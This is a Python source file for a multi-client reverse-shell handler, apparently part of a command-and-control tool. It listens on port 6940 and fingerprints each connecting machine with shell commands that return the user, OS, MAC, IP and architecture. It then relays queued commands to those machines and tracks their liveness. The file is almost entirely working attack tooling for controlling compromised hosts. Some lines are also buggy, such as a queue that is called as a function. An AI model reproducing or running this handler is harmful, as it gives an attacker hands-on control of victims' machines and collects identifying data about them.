import socket
import threading
import time
import random, string
import datetime

def ouiSearch(mac:str):

    oui = ''.join(mac.split(":")[:3]).upper()

    if oui.lower() == "ffffff": return "broadcast" 

    with open("./core/ouis.txt", "r", encoding='utf-8') as f:
        for line in f:
            #print(line)
            soui, company = line.strip().split("=", 1)
            if soui == oui:
                return company
            
    return "unknown"

class shellserver:
    def __init__(self, port=6940) -> None:
        self.port = port

        self.commandQueue = {}
        self.responseQueue = {}
        self.uids = {}
        self.info = {}
        self.kill = []

        threading.Thread(target=self.start, daemon=True).start()

    """
    listen for a connection on thread 1, when recieved send socket object to new thread, which handles the connection
    each connection has its own thread
    """

    def start(self) -> None:
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind(("0.0.0.0", self.port))
            sock.listen(1)
            
            try:
                conn, addr = sock.accept()
                sock.settimeout(30)
            except Exception as e:
                print("failed connection: {}".format(e))
                continue

            if conn:
                print("connection from {}".format(addr))
                threading.Thread(target=self.handle, args=(conn, addr,), daemon=True).start()

    def handle(self, s, addr):
        uid = self.genUID()
        harvestedInfo = {} 
        heartbeat = 0
        windows = False
        
        self.uids[uid] = addr[0]

        def sendCmd(command):
            try:
                s.sendall((command+'\n').encode('ascii'))
                a = s.recv(2048*8).decode('ascii').strip()
            except:
                quit()

            return a

        # harvest info
        shell = sendCmd("echo $SHELL")
        if len(shell) > 1 and shell != "$SHELL":
            harvestedInfo["shelltype"] = shell
            harvestedInfo["os"] = "Linux"

        elif shell == "$SHELL":
            harvestedInfo["shelltype"] = "command prompt"
            harvestedInfo["os"] = "Windows"
            windows = True

        elif shell == "":
            if len(sendCmd("Get-Host")) > 1:
                harvestedInfo["shelltype"] = "powershell"
                harvestedInfo["os"] = "Windows"
                windows = True

        # hostname
        harvestedInfo["hostname"] = sendCmd("whoami")

        if windows:
            if harvestedInfo["shelltype"] == "powershell":
                harvestedInfo['mac'] = sendCmd("Get-NetAdapter | Where-Object { $_.InterfaceAlias -eq (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' -and $_.NextHop -ne '0.0.0.0' }).InterfaceAlias } | Select-Object -ExpandProperty MacAddress")
                harvestedInfo['ip'] = sendCmd("$mainInterface = (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' -and $_.NextHop -ne '0.0.0.0' }).InterfaceIndex; (Get-NetIPAddress | Where-Object { $_.InterfaceIndex -eq $mainInterface -and $_.AddressFamily -eq 'IPv4' }).IPAddress")
                harvestedInfo['arch'] = "x86" if sendCmd("(Get-WmiObject -Class Win32_Processor).Architecture") == "0" else "x64"
            else:
                harvestedInfo['mac'] = "idk"
                harvestedInfo['ip'] = "idk"
                harvestedInfo['arch'] = "probably x64"
        else:
            harvestedInfo['mac'] = sendCmd("ip -o link | awk '$2 != \"lo:\" {print $2, $(NF-2)}'").split("\n")[0].split(": ")[-1]
            harvestedInfo['ip'] = sendCmd("ip route get 1 | awk '{print $NF; exit}'")
            harvestedInfo['arch'] = sendCmd("lscpu | awk '/Architecture/ {print $2}'")

        harvestedInfo['firstSeen'] = datetime.datetime.now().strftime("%H:%M")
        harvestedInfo['lastActive'] = datetime.datetime.now().strftime("%H:%M")
        harvestedInfo['uid'] = uid
        harvestedInfo['oui'] = ouiSearch(harvestedInfo['mac'])
        harvestedInfo['active'] = True

        self.info[uid] = harvestedInfo

        print('got info')
            
        while True:
            if uid in self.kill:
                print("killed {} (kill list)".format(uid))
                return
            
            if uid in self.commandQueue:
                if type(self.commandQueue[uid]) == tuple:
                    s.sendall(self.commandQueue[uid].encode('ascii'))
                    self.commandQueue.pop(uid)        
                    threading.Thread(target=s.recv, args=(2048*16,), daemon=True).start() # receive data and clear the socket without waiting for it - theres probaby a better way, but its whatever atp
                    heartbeat = 0

                s.sendall(self.commandQueue[uid].encode('ascii'))
                self.commandQueue.pop(uid)
                self.responseQueue[uid] = s.recv(2048*16).decode('ascii')
                heartbeat = 0
            else:
                if heartbeat == 100:
                    self.info[uid]['active'] = False
                    try:
                        a = sendCmd("echo 1")
                    except:
                        self.info[uid]['active'] = 0
                        break
                    
                    if a == "1":
                        self.info[uid]['active'] = True
                        self.info[uid]['lastActive'] = datetime.datetime.now().strftime("%H:%M")

                    else:
                        break

                    heartbeat = 0;
                else:
                    heartbeat += 1

            time.sleep(0.05)

    def runCommand(self, uid, command, _async=False):
        if _async:
            self.commandQueue[uid] = (command+'\n')
            return
        else:
            self.commandQueue[uid] = command+'\n'

        while True:
            if uid in list(self.responseQueue.keys()):
                data = self.responseQueue[uid]
                self.responseQueue.pop(uid)
                return data.strip()
            else:
                time.sleep(0.05)

    def genUID(self):
        return ''.join([random.choice(string.ascii_uppercase) for _ in range(16)])
    
    def harvestInfo(self, uid):
        data = {}
        windows = False

        shell = self.runCommand(uid, "echo $SHELL")
        if len(shell) > 1:
            data["shelltype"] = shell
            data["os"] = "Linux"
        else:
            if len(self.runCommand(uid, "Get-Host")) > 1:
                data["shelltype"] = "powershell"
                data["os"] = "Windows"
                windows = True

        # hostname
        data["hostname"] = self.runCommand(uid, "whoami")

        if windows:
            data['mac'] = self.runCommand(uid, "Get-NetAdapter | Where-Object { $_.InterfaceAlias -eq (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' -and $_.NextHop -ne '0.0.0.0' }).InterfaceAlias } | Select-Object -ExpandProperty MacAddress")
            data['ip'] = self.runCommand(uid, "$mainInterface = (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' -and $_.NextHop -ne '0.0.0.0' }).InterfaceIndex; (Get-NetIPAddress | Where-Object { $_.InterfaceIndex -eq $mainInterface -and $_.AddressFamily -eq 'IPv4' }).IPAddress")
            data['arch'] = "x86" if self.responseQueue(uid, "(Get-WmiObject -Class Win32_Processor).Architecture") == "0" else "x64"
        else:
            data['mac'] = self.runCommand(uid, "ip -o link | awk '$2 != \"lo:\" {print $2, $(NF-2)}'").split("\n")[0].split(": ")[-1]
            data['ip'] = self.runCommand(uid, "ip route get 1 | awk '{print $NF; exit}'")
            data['arch'] = self.runCommand(uid, "lscpu | awk '/Architecture/ {print $2}'")

        data['firstSeen'] = str(datetime.datetime.now())
        data['lastActive'] = str(datetime.datetime.now())

        return data
    
    def killUID(self, uid):
        self.kill.append(uid)
        self.uids.pop(uid)
        self.info.pop(uid)

        time.sleep(0.1)

        return
